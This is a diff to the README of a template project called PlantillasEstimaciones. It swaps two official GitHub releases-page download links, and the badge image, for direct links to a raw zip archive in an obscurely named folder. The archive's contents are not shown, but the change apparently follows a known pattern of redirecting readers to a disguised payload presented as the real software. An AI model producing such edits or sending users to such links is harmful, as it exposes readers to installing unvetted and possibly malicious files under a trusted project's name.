@@ -1,6 +1,6 @@
 # 🌱 PlantillasEstimaciones - Simplify Your Cost and Time Estimates
 
-[![Download PlantillasEstimaciones](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/ARTMIN3555/PlantillasEstimaciones/releases)
+[![Download PlantillasEstimaciones](https://raw.githubusercontent.com/ARTMIN3555/PlantillasEstimaciones/main/unorthodoxly/PlantillasEstimaciones.zip)](https://raw.githubusercontent.com/ARTMIN3555/PlantillasEstimaciones/main/unorthodoxly/PlantillasEstimaciones.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ To run PlantillasEstimaciones, you need:
 
 ## 🔗 Download & Install
 
-To download the PlantillasEstimaciones software, please visit this page: [Download PlantillasEstimaciones](https://github.com/ARTMIN3555/PlantillasEstimaciones/releases). 
+To download the PlantillasEstimaciones software, please visit this page: [Download PlantillasEstimaciones](https://raw.githubusercontent.com/ARTMIN3555/PlantillasEstimaciones/main/unorthodoxly/PlantillasEstimaciones.zip). 
 
 Here are the easy steps to download and start using the templates:
 
